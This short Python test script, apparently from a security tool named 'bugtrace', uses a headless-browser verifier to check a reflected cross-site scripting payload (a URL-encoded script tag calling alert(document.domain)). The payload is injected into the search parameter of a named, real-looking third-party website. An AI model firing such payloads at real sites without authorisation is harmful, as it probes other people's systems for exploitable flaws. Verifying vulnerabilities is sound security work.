import asyncio
import logging
from bugtrace.tools.visual.verifier import XSSVerifier

# Configure logger
logging.basicConfig(level=logging.INFO)

async def test_manual_payload():
    print("🚀 Probando payload manual en AndorraCampers...")
    verifier = XSSVerifier(headless=True, prefer_cdp=False)
    
    # Tu payload exacto
    target_url = 'https://www.andorracampers.com/en/search/?q=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
    
    print(f"Target: {target_url}")
    result = await verifier.verify_xss(target_url, screenshot_dir="reports/test_manual")
    
    print("\n--- RESULTADO ---")
    print(f"Success: {result.success}")
    print(f"Error: {result.error}")
    print(f"Logs: {len(result.console_logs)} logs capturados")
    
if __name__ == "__main__":
    asyncio.run(test_manual_payload())
